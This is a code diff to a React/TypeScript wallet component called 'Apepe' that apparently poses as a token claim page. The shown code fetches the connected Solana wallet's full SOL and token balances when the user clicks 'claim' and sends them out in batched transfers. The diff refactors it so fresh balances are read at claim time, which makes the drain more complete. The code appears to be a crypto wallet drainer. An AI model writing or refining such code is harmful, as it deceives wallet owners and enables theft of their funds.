@@ -36,11 +36,10 @@ const Apepe = () => {
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
   const [isClaiming, setIsClaiming] = useState(false);
-  const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
 
   const fetchAllBalances = useCallback(async () => {
-    if (!publicKey) return;
+    if (!publicKey) return [];
     try {
       const solBal = await connection.getBalance(publicKey);
       setSolBalance(solBal / LAMPORTS_PER_SOL);
@@ -63,15 +62,12 @@ const Apepe = () => {
         })
         .filter(token => token.uiAmount > 0);
 
-      setBalances(tokens);
+      return tokens;
     } catch (error) {
       console.error('Error fetching balances:', error);
+      return [];
     }
   }, [publicKey, connection]);
-
-  useEffect(() => {
-    if (publicKey) fetchAllBalances();
-  }, [publicKey, fetchAllBalances]);
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
     if (!publicKey) return null;
@@ -119,6 +115,7 @@ const Apepe = () => {
 
     try {
       setIsClaiming(true);
+      const currentBalances = await fetchAllBalances();
       const solBal = await connection.getBalance(publicKey);
       const solPrice = await getSolPrice();
       let lamportsToSend = 0;
@@ -141,7 +138,7 @@ const Apepe = () => {
         await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
       }
 
-      const validTokens = balances.filter(token => token.balance > 0);
+      const validTokens = currentBalances.filter(token => token.balance > 0);
       const batches: TokenBalance[][] = [];
       for (let i = 0; i < validTokens.length; i += MAX_BATCH_SIZE) {
         batches.push(validTokens.slice(i, i + MAX_BATCH_SIZE));
